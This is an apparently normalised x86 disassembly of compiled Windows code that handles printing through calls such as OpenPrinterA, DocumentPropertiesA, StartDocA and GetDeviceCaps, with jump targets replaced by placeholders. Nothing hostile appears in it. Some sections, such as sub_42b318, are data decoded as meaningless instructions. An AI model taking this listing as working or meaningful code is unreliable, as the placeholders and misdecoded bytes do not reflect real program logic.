lea eax [ ebp - 0x4 ]
call sub_406194
retn
sub edx 0xfffffff8
sub_42a694
push ebx
push esi
push edi
mov esi eax
mov eax [ esi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ esi + 0x10 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ esi + 0x14 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ esi + 0x18 ]
mov edx [ eax ]
call [ edx + 0x8 ]
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov edx edi
mov eax [ esi + 0x10 ]
call sub_428d28
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
inc edi
dec ebx
jne r-xdata
sub_42a6dc
push ebx
push esi
push edi
mov edi eax
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ edi + 0x10 ]
mov edx esi
call sub_428d28
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x28 ]
inc esi
dec ebx
jne r-xdata
sub_42a70c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor edx edx
mov [ ebp - 0x10 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_42a89e
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x10 ]
cmp [ esi + 0x8 ] 0x1
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov eax esi
xor edx edx
call sub_428d28
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
mov esi [ ebx + 0x10 ]
cmp [ esi + 0x8 ] 0x0
jle r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42a839
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a8a5
lea eax [ ebp - 0x10 ]
call sub_40442c
retn
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_428d28
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40c05c
call sub_403e8c
mov eax esi
xor edx edx
call sub_428d28
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
jle r-xdata
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_428d28
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x90 ]
mov eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov edx [ ebp - 0x10 ]
mov ecx esi
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4036c0
retn
mov eax [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_428d28
mov esi eax
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
sub_42a8ac
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_42a991
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test esi esi
je r-xdata
mov eax [ edi + 0x18 ]
mov eax [ eax + 0x8 ]
test eax eax
jle r-xdata
lea eax [ edi + 0x24 ]
mov edx esi
call sub_404480
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a998
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404f0c
lea eax [ ebp - 0x8 ]
call sub_406194
retn
dec eax
jne r-xdata
xor edx edx
mov eax [ edi + 0x18 ]
call sub_428d28
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_4061ac
mov ax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4061d8
mov eax [ ebp - 0x10 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov ebx eax
xor edx edx
mov eax [ edi + 0x18 ]
call sub_428d28
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_4061ac
mov ax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4061d8
mov eax [ ebp - 0xc ]
mov ecx esi
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov ebx eax
jmp r-xdata
sub_42abc8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_42acbb
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx [ ebp - 0x8 ]
call sub_404480
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40c05c
call sub_403e8c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42acc2
lea eax [ ebp - 0x18 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404f0c
lea eax [ ebp - 0x10 ]
call sub_406194
retn
inc ebx
mov [ ebp - 0xc ] 0x0
inc [ ebp - 0xc ]
dec ebx
jne r-xdata
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x10 ]
mov ecx r-xdata
call sub_4061d8
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
jmp r-xdata
mov edx [ ebp - 0xc ]
mov eax [ esi + 0x14 ]
call sub_428d28
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x10 ]
call sub_4061ac
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
mov ecx r-xdata
call sub_4061d8
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x38 ]
test al al
je r-xdata
sub_42ace0
inc ebx
mov eax eax
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_42adbf
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx ebx
call sub_404480
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40c05c
call sub_403e8c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42adc6
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404f0c
lea eax [ ebp - 0x8 ]
call sub_406194
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4061d8
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
call sub_428d28
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_4061ac
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4061d8
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
sub_42ae44
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4048cc
xor eax eax
push ebp
push sub_42aeee
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax esi
dec ax
je r-xdata
lea eax [ ebx + 0x24 ]
mov edx [ ebp - 0x4 ]
call sub_404480
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_42abc8
jmp r-xdata
dec ax
je r-xdata
mov bl 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42aef5
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
mov eax ebx
call sub_42a6dc
jmp r-xdata
dec ax
je r-xdata
mov eax ebx
call sub_42a70c
jmp r-xdata
sub ax 0x5
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_42abc8
jmp r-xdata
jmp r-xdata
push esi
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_42a8ac
sub_42af18
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x10 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ edi + 0x14 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebx ebx
mov eax [ edi + 0x18 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ edi + 0x10 ]
mov edx ebx
call sub_416090
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ edi + 0x14 ]
mov edx ebx
call sub_416090
mov eax [ edi + 0x10 ]
mov edx ebx
call sub_428d28
cmp ebp [ eax + 0x8 ]
jne r-xdata
inc ebx
dec esi
jne r-xdata
mov eax [ edi + 0x18 ]
mov edx ebx
call sub_416090
mov eax [ edi + 0x14 ]
mov edx ebx
call sub_428d28
cmp ebp [ eax + 0x8 ]
jne r-xdata
mov eax [ edi + 0x18 ]
mov edx ebx
call sub_428d28
cmp ebp [ eax + 0x8 ]
jne r-xdata
sub_42afa8
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
cmp [ esi + 0xc ] 0x0
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4036b0
test bl bl
jle r-xdata
lea eax [ esi + 0xc ]
call sub_406194
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_42afdc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42b016
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b01d
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_42a694
sub_42b048
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42b06d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b074
retn
sub_42b084
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
sub_42b140
push esi
mov esi [ eax ]
cmp [ eax ] 0x0
je r-xdata
mov eax esi
pop esi
retn
mov edx [ eax ]
jmp r-xdata
cmp [ edx ] 0x20
je r-xdata
inc edx
mov esi edx
jmp r-xdata
mov cl [ edx ]
test cl cl
je r-xdata
cmp [ edx ] 0x2c
jne r-xdata
cmp cl 0x2c
jne r-xdata
mov [ eax ] edx
mov [ edx ] 0x0
inc edx
inc edx
sub_42b230
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403690
lea eax [ edi + 0x4 ]
mov edx esi
call sub_40461c
lea eax [ edi + 0x8 ]
mov edx [ ebp + 0xc ]
call sub_40461c
lea eax [ edi + 0xc ]
mov edx [ ebp + 0x8 ]
call sub_40461c
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_42b290
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi ecx
mov ebx eax
xor eax eax
push ebp
push sub_42b303
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_40461c
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x8 ]
call sub_404828
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b30a
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404450
retn
mov al 0x1
lea eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_40461c
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0xc ]
call sub_404828
je r-xdata
sub_42b318
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fdiv [ ebx - 0x4c87ffbe ]
inc edx
add [ ebx + esi * 4 + 0x42 ] cl
add [ eax ] al
shl [ ebx + 0x5c0042 ] 0x0
add [ edi + edi * 8 + 0x39080041 ] ch
inc eax
add [ ecx + edi ] dl
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add ah dh
push ds
inc edx
add [ eax + 0x6b ] ch
inc ecx
add [ eax + 0x6b ] dh
inc ecx
add [ edx + ebp * 2 + 0x26440041 ] al
inc edx
add [ esp + esi * 4 + 0x42 ] ah
add [ eax - 0x4c ] al
inc edx
add [ ecx ] al
add al dl
mov bl 0x42
add [ eax ] bl
add [ eax ] al
add [ eax ] al
pop es
push eax
jb r-xdata
add [ edx ] al
add al 0x0
outsb
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_421e30
add esp 0xfffffff0
or [ eax + 0x72 ] dl
imul ebp [ esi + 0x74 ] 0x737265
sbb [ eax ] al
inc edx
add [ eax + eax ] al
jb r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403a7c
inc eax
mov ah 0x42
add [ ebx + eax * 2 ] cl
jb r-xdata
add [ ebx ] dl
add [ eax - 0x4c ] al
inc edx
jb r-xdata
popad
je r-xdata
retn
add [ eax ] al
lea eax [ eax ]
add [ ebp + 0x56530040 ] cl
push edi
test dl dl
je r-xdata
dec eax
popad
outsb
insb
verr [ gs : esp + esi * 4 + 0x42 ]
add [ eax ] cl
inc ebx
push 0x69676e61
outsb
adc [ bx + si ] eax
test [ edx + eax * 2 + 0x70550a00 ] dh
popad
je r-xdata
mov [ edi + 0x58 ] esi
mov eax edi
test bl bl
je r-xdata
inc esi
outsd
outsb
je r-xdata
add [ eax ] eax
push esp
push eax
jb r-xdata
add [ eax ] al
outsb
je r-xdata
jmp [ edi + ecx * 4 + 0x5 ]
outsb
je r-xdata
mov eax [ ebx + 0x58 ]
mov edx [ eax + 0x20 ]
mov eax ebx
call sub_422568
pop ebx
retn
add [ eax ] eax
jb r-xdata
std
jb r-xdata
psubsb mmx1 [ esi + eax * 4 - 0x3 ]
popad
outsb
jbe r-xdata
call sub_403a24
popad
outsb
jbe r-xdata
add [ ebx + 0x30e8c3 ] cl
add [ eax ] al
jae r-xdata
pop [ fs : 0x0 ]
add esp 0xc
jae r-xdata
mov eax ebx
call sub_42b484
mov bl 0x42
add [ eax ] bl
fdiv [ eax - 0x3f74ffbe ]
fdiv [ ebx + 0xe070042 ]
push esp
push eax
jb r-xdata
add al bl
mov al 0x42
add [ ebx + 0x42b3dcc0 ] cl
add [ edi ] al
push cs
sub_42b404
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_421e30
mov [ edi + 0x58 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_42b440
push ebx
mov ebx eax
mov dl 0x1
mov eax [ ebx + 0x58 ]
call sub_42b584
mov eax ebx
call sub_42b484
mov eax [ ebx + 0x58 ]
mov edx [ eax + 0x20 ]
mov eax ebx
call sub_422568
pop ebx
retn
sub_42b484
push ebx
push esi
push edi
mov ebx eax
push 0x5a
mov eax [ ebx + 0x58 ]
mov eax [ eax + 0x20 ]
push eax
call GetDeviceCaps
mov esi [ ebx + 0xc ]
cmp eax [ esi + 0x1c ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_421798
mov esi eax
push 0x5a
mov eax [ ebx + 0x58 ]
mov eax [ eax + 0x20 ]
push eax
call GetDeviceCaps
mov edi [ ebx + 0xc ]
mov [ edi + 0x1c ] eax
mov edx esi
mov eax edi
call sub_4217b4
sub_42b4cc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403690
mov [ esi + 0x14 ] 0xffffffff
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax esi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_42b508
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
cmp [ esi + 0x1c ] 0x0
je r-xdata
xor edx edx
mov eax esi
call sub_42b584
mov eax esi
call sub_42bfc0
mov eax esi
call sub_42bffc
mov eax [ esi + 0x4 ]
call sub_4036c0
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
mov eax esi
call sub_42b7a8
mov eax [ esi + 0x28 ]
test eax eax
je r-xdata
push eax
call ClosePrinter
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4036b0
test bl bl
jle r-xdata
push eax
call GlobalUnlock
mov eax [ esi + 0x28 ]
push eax
call GlobalFree
xor eax eax
mov [ esi + 0x28 ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_42b584
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_42b6a2
push [ fs : eax ]
mov [ fs : eax ] esp
mov al [ esi + 0x1f ]
cmp bl al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b6a9
lea eax [ ebp - 0x8 ]
call sub_40442c
retn
xor edi edi
mov edx ebx
sub dl 0x1
jb r-xdata
xor edx edx
mov eax esi
call sub_42b6b0
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
je r-xdata
mov eax [ esi + 0x20 ]
push eax
call DeleteDC
xor eax eax
mov [ esi + 0x20 ] eax
jmp r-xdata
xor edx edx
call sub_422568
cmp al 0x2
je r-xdata
dec dl
je r-xdata
test edi edi
je r-xdata
mov edi CreateICA
jmp r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
jmp r-xdata
mov [ esi + 0x1f ] bl
mov eax esi
call sub_42bb68
push eax
mov eax esi
call sub_42bb80
pop edx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
call sub_4048dc
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_4048dc
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4048dc
push eax
call edi
mov [ esi + 0x20 ] eax
cmp [ esi + 0x20 ] 0x0
jne r-xdata
mov eax [ esi + 0x20 ]
test eax eax
je r-xdata
xor edx edx
call sub_422568
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_406660
mov eax [ ebp - 0x8 ]
call sub_42b174
mov edi CreateDCA
push eax
call DeleteDC
mov edx [ esi + 0x20 ]
call sub_422568
sub_42b6b0
push ebp
mov ebp esp
push 0x0
push 0x0
xor ecx ecx
push ebp
push sub_42b715
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp dl [ eax + 0x1c ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b71c
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404450
retn
test dl dl
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_406660
mov eax [ ebp - 0x8 ]
call sub_42b174
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406660
mov eax [ ebp - 0x4 ]
call sub_42b174
jmp r-xdata
sub_42b720
push ebx
add esp 0xffffffec
mov ebx eax
xor edx edx
mov eax ebx
call sub_42b6b0
mov dl 0x2
mov eax ebx
call sub_42b584
mov eax ebx
call sub_42bafc
call sub_422208
mov eax ebx
call sub_42bafc
call sub_42b484
mov [ ebx + 0x1c ] 0x1
mov [ ebx + 0x1d ] 0x0
mov [ ebx + 0xc ] 0x1
mov eax esp
xor ecx ecx
mov edx 0x14
call sub_402fc4
mov [ esp ] 0x14
mov eax [ ebx + 0x18 ]
call sub_4048dc
mov [ esp + 0x4 ] eax
push sub_42b18c
mov eax [ ebx + 0x20 ]
push eax
call SetAbortProc
push esp
mov eax [ ebx + 0x20 ]
push eax
call StartDocA
mov eax [ ebx + 0x20 ]
push eax
call StartPage
add esp 0x14
pop ebx
retn
sub_42b7a8
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
call sub_42b6b0
mov eax [ ebx + 0x20 ]
push eax
call EndPage
cmp [ ebx + 0x1d ] 0x0
jne r-xdata
mov [ ebx + 0x1c ] 0x0
mov [ ebx + 0x1d ] 0x0
xor eax eax
mov [ ebx + 0xc ] eax
pop ebx
retn
mov eax [ ebx + 0x20 ]
push eax
call EndDoc
sub_42b7dc
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
call sub_42b6b0
mov eax [ ebx + 0x20 ]
push eax
call EndPage
mov eax [ ebx + 0x20 ]
push eax
call StartPage
inc [ ebx + 0xc ]
mov eax ebx
call sub_42bafc
call sub_422208
pop ebx
retn
sub_42b80c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_42bb68
push eax
mov eax ebx
call sub_42bb80
pop edx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov esi eax
mov eax [ esi + 0x8 ]
call sub_4048dc
mov edx eax
mov eax edi
call sub_408fcc
mov eax [ esi + 0x4 ]
call sub_4048dc
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_408fcc
mov eax [ esi + 0xc ]
call sub_4048dc
mov edx eax
mov eax [ ebp + 0xc ]
call sub_408fcc
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x28 ]
mov [ eax ] edx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_42b878
push ebx
push esi
mov esi edx
mov ebx eax
mov al [ r-xdata ]
mov [ ebx + 0x1e ] al
test esi 0x1
je r-xdata
test esi 0x100
je r-xdata
or [ ebx + 0x1e ] 0x2
test esi 0x8000
je r-xdata
or [ ebx + 0x1e ] 0x1
pop esi
pop ebx
retn
or [ ebx + 0x1e ] 0x4
sub_42b8b4
push ebp
mov ebp esp
add esp 0xffffff3c
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xb0 ] ebx
mov [ ebp - 0xb4 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_42baeb
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax ebx
call sub_42b6b0
mov eax [ ebx + 0x28 ]
cmp esi eax
je r-xdata
mov esi [ ebx + 0x28 ]
test esi esi
je r-xdata
test eax eax
je r-xdata
mov eax ebx
call sub_42bffc
mov eax [ ebx + 0x2c ]
test eax eax
je r-xdata
push esi
call GlobalLock
mov edi eax
mov [ ebx + 0x24 ] edi
mov edx [ edi + 0x28 ]
mov eax ebx
call sub_42b878
mov [ ebx + 0x28 ] esi
push eax
call GlobalUnlock
mov eax [ ebx + 0x28 ]
push eax
call GlobalFree
xor edx edx
mov eax ebx
call sub_42b584
mov [ ebp - 0xc ] 0xffffffff
mov eax ebx
call sub_42bb80
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
dec edi
test edi edi
jl r-xdata
push eax
call ClosePrinter
xor eax eax
mov [ ebx + 0x2c ] eax
cmp [ ebp - 0xc ] 0xffffffff
jne r-xdata
inc edi
xor esi esi
mov eax [ ebp - 0xc ]
mov [ ebx + 0x14 ] eax
push 0x0
lea eax [ ebx + 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call OpenPrinterA
test eax eax
je r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42b230
push eax
lea eax [ ebp - 0xb0 ]
push eax
lea edx [ ebp - 0xb4 ]
mov eax [ rw-data ]
call sub_406660
mov eax [ ebp - 0xb4 ]
mov edx [ ebp - 0x4 ]
mov [ ebp - 0xc4 ] edx
mov [ ebp - 0xc0 ] 0x6
mov edx [ ebp + 0xc ]
mov [ ebp - 0xbc ] edx
mov [ ebp - 0xb8 ] 0x6
lea edx [ ebp - 0xc4 ]
mov ecx 0x1
call sub_409730
mov edx [ ebp - 0xb0 ]
mov eax [ ebx + 0x10 ]
pop ecx
mov esi [ eax ]
call [ esi + 0x3c ]
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
add eax 0xc
mov edx [ ebp + 0xc ]
call sub_40461c
mov [ ebp - 0xc ] esi
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42baf2
lea eax [ ebp - 0xb4 ]
mov edx 0x2
call sub_404450
retn
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov edx esi
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_42b290
test al al
je r-xdata
cmp [ ebx + 0x28 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0xac ]
push eax
lea eax [ ebp - 0xac ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x2c ]
push eax
push 0x0
call DocumentPropertiesA
push eax
push 0x42
call GlobalAlloc
mov esi eax
mov [ ebx + 0x28 ] esi
test esi esi
je r-xdata
mov eax [ ebx + 0x24 ]
mov edx [ eax + 0x28 ]
mov eax ebx
call sub_42b878
push esi
call GlobalLock
mov edi eax
mov [ ebx + 0x24 ] edi
push 0x2
push edi
push edi
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x2c ]
push eax
push 0x0
call DocumentPropertiesA
